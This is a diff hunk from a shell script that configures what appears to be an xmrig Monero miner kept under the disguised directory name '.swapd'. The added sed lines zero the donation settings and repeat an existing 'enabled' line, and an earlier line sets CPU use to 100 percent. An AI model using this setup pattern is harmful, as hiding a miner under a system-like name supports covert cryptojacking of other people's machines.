@@ -255,6 +255,9 @@ sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.j
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
+sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.swapd/config.json
 
 #echo "[*] Copying xmrig-proxy config"
 
